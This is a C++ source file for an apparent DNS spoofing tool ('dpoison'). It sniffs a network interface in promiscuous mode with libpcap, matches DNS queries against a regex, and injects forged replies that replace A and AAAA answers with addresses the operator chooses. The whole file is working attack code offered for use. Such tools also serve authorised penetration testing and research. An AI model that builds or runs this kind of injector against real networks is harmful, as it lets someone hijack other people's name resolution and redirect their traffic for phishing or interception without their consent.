#ifndef _BSD_SOURCE
#define _BSD_SOURCE
#endif

#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>

#include <iostream>
#include <cstdlib>

#include <pcap.h>

#include <boost/program_options.hpp>
#include <boost/regex.hpp>

#include "dns.hpp"
#include "socket.hpp"

inline std::ostream &operator <<(std::ostream &out, const timeval &tv)
{
	char str[64];
	struct tm tm;

	localtime_r((time_t *)&tv.tv_sec, &tm);
	strftime(str, sizeof(str), "%F %R:%S", &tm);

	out << str << "." << tv.tv_usec;
	return out;
}

class pcap {
	public:
		pcap(const std::string &name, int max_size) : m_dev(name), m_session(NULL) {
			int err;
			char errbuf[PCAP_ERRBUF_SIZE];

			err = pcap_lookupnet(name.c_str(), &m_net, &m_mask, errbuf);
			if (err) {
				std::ostringstream ss;

				ss << "pcap: failed to lookup device '" << name << "': " << errbuf;
				throw std::runtime_error(ss.str());
			}

			int promisc = 1;
			int ms = 1000;

			m_session = pcap_open_live(m_dev.c_str(), max_size, promisc, ms, errbuf);
			if (!m_session) {
				std::ostringstream ss;

				ss << "pcap: failed to open live stream on '" << m_dev << "': " << errbuf;
				throw std::runtime_error(ss.str());
			}

			if (pcap_datalink(m_session) != DLT_EN10MB) {
			}
		}

		~pcap() {
			pcap_close(m_session);
		}

		typedef std::function<void (const struct pcap_pkthdr *, const u_char *)> pcap_process_t;
		void run(const std::string &filter, const pcap_process_t &handler) {
			int err;

			if (filter.size()) {
				int optimize = 0;
				struct bpf_program fp;

				err = pcap_compile(m_session, &fp, filter.c_str(), optimize, m_mask);
				if (err) {
					std::ostringstream ss;

					ss << "pcap: failed to compile filter '" << filter << "' on '" << m_dev <<
						"': " << pcap_geterr(m_session);
					throw std::runtime_error(ss.str());
				}

				err = pcap_setfilter(m_session, &fp);
				if (err) {
					std::ostringstream ss;

					ss << "pcap: failed to install filter '" << filter << "' on '" << m_dev <<
						"': " << pcap_geterr(m_session);
					throw std::runtime_error(ss.str());
				}
			}

			err = pcap_loop(m_session, -1, pcap::got_packet_callback, (u_char *)&handler);
			if (err) {
				std::ostringstream ss;

				ss << "pcap: failed to start receiving loop on '" << m_dev << "': " << pcap_geterr(m_session);
				throw std::runtime_error(ss.str());
			}
		}

	private:
		std::string m_dev;
		pcap_t *m_session;
		bpf_u_int32 m_mask, m_net;

		static void got_packet_callback(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
			if (header->caplen != header->len) {
				std::cout << "pcap: length mismatch: " <<
					"caplen: " << header->caplen << ", wire-length: " << header->len << std::endl;
				return;
			}

			pcap_process_t *handler = (pcap_process_t *)args;
			(*handler)(header, packet);
		}

};

class basic_process {
	public:
		basic_process(const std::string &query, const std::map<u16, std::string> &rdata_repl, u32 ttl) : m_re(query), m_repl(rdata_repl), m_ttl(ttl) {
		}

		void got_packet(const struct pcap_pkthdr *header, const u_char *packet) {
			const struct ether_header *eth;
			const struct ip *ip;
			const struct udphdr *udp;

			eth = (const struct ether_header *)packet;
			ip = (const struct ip *)(packet + sizeof(*eth));

#define IP_HL(ip)		(((ip)->ip_hl) & 0x0f)
#define IP_V(ip)		(((ip)->ip_hl) >> 4)

			int ip_size = IP_HL(ip) * 4;
			udp = (struct udphdr *)(packet + sizeof(*eth) + ip_size);

			try {
				u_char *data = (u_char *)(((u_char *)udp) + 8);
				query q(data, ntohs(udp->len));

				if (q.match(m_re)) {
					std::cout << header->ts << ": " << dump_eth(eth) << " : " << dump_addr(ip, udp) << std::endl;

					if (m_repl.size())
						inject(eth, ip, udp, q);
				}
			} catch (const std::exception &e) {
				std::cout << "failed to process: " << e.what() << std::endl;
			}
		}

	private:
		boost::regex m_re;
		std::map<u16, std::string> m_repl;
		u32 m_ttl;

		ioremap::dpoison::socket m_sock;

		void dump_eth_single(std::ostringstream &ss, const u_int8_t *header) {
			char tmp[4];

			for (int i = 0; i < ETH_ALEN; ++i) {
				snprintf(tmp, sizeof(tmp), "%02x", header[i]);
				ss << tmp;
				if (i < ETH_ALEN - 1)
					ss << ":";
			}
		}

		std::string dump_eth(const struct ether_header *eth) {
			std::ostringstream ss;
			dump_eth_single(ss, eth->ether_shost);
			ss << " -> ";
			dump_eth_single(ss, eth->ether_dhost);
			//ss << ", type: " << eth->ether_type;

			return ss.str();
		}

		std::string dump_addr(const struct ip *ip, const struct udphdr *udp) {
			std::ostringstream ss;

			ss << inet_ntoa(ip->ip_src) << ":" << ntohs(udp->source);
			ss << " -> ";
			ss << inet_ntoa(ip->ip_dst) << ":" << ntohs(udp->dest);
			ss << " : data-size: " << ntohs(udp->len);

			return ss.str();
		}

		void inject(const struct ether_header *eth, const struct ip *ip, const struct udphdr *udp, const query &q) {
			std::string str = q.pack(m_repl, m_ttl);

			m_sock.send(eth, ip, udp, str);
		}
};

class addr {
	public:
		addr(const std::string &addr_str, bool ipv6) {
			struct addrinfo *ai = NULL, hint;
			int err;

			memset(&hint, 0, sizeof(struct addrinfo));

			if (ipv6) {
				hint.ai_family = AF_INET6;
			} else {
				hint.ai_family = AF_INET;
			}

			err = getaddrinfo(addr_str.c_str(), NULL, &hint, &ai);
			if (!err && ai) {
				if (ipv6) {
					struct sockaddr_in6 *in = (struct sockaddr_in6 *)ai->ai_addr;
					m_addr.assign((char *)&in->sin6_addr, sizeof(in->sin6_addr));
				} else {
					struct sockaddr_in *in = (struct sockaddr_in *)ai->ai_addr;
					m_addr.assign((char *)&in->sin_addr, sizeof(in->sin_addr));
				}
			}

			if (!err && !ai)
				err = -ENXIO;
			freeaddrinfo(ai);

			if (err) {
				std::ostringstream ss;
				ss << "addr: could not convert '" << addr_str << "': " << err;
				throw std::runtime_error(ss.str());
			}
		}

		const std::string &get() const {
			return m_addr;
		}

	private:
		std::string m_addr;
};

int main(int argc, char *argv[])
{
	namespace bpo = boost::program_options;

	bpo::options_description generic("Parser options");

	std::string device, query, a_repl, aaaa_repl;
	u32 ttl;
	int max_size;
	generic.add_options()
		("help", "This help message")
		("size", bpo::value<int>(&max_size)->default_value(1000), "Maximum capture size for single packet")
		("device", bpo::value<std::string>(&device), "Sniffing device")
		("query", bpo::value<std::string>(&query), "DNS query to hijack replies")
		("ttl", bpo::value<u32>(&ttl)->default_value(100), "DNS record TTL")
		("A", bpo::value<std::string>(&a_repl), "Replace A record reply with this address")
		("AAAA", bpo::value<std::string>(&aaaa_repl), "Replace AAAA record reply with this address")
		;

	bpo::positional_options_description positional;
	positional.add("filter", -1);

	std::vector<std::string> words;
	bpo::options_description hidden("Hidden options");
	hidden.add_options()
		("filter", bpo::value<std::vector<std::string>>(&words), "Sniffing filter (man tcpdump)")
	;

	bpo::options_description cmdline_options;
	cmdline_options.add(generic).add(hidden);

	bpo::variables_map vm;
	try {
		bpo::store(bpo::command_line_parser(argc, argv).options(cmdline_options).positional(positional).run(), vm);
		bpo::notify(vm);
	} catch (const std::exception &e) {
		std::cerr << "command line parser error: " << e.what() << "\n" << generic;
		return -1;
	}

	if (!vm.count("device")) {
		std::cerr << "No device specified\n" << generic;
		return -1;
	}

	if ((size_t)max_size < sizeof(struct ip) + sizeof(struct udphdr) + sizeof(struct ether_header)) {
		std::cerr << "You are going to use too small buffer size " << max_size << ", DNS packet will not fit it\n" << generic;
		return -1;
	}

	std::ostringstream filter;
	std::copy(words.begin(), words.end(), std::ostream_iterator<std::string>(filter, " "));

	std::map<u16, std::string> rdata_repl;
	if (a_repl.size()) {
		addr a(a_repl, false);
		rdata_repl[QUERY_TYPE_A] = a.get();
	}
	if (aaaa_repl.size()) {
		addr a(aaaa_repl, true);
		rdata_repl[QUERY_TYPE_AAAA] = a.get();
	}

	basic_process process(query, rdata_repl, ttl);

	pcap p(device, max_size);
	p.run(filter.str(), std::bind(&basic_process::got_packet, &process, std::placeholders::_1, std::placeholders::_2));

	return 0;	
}
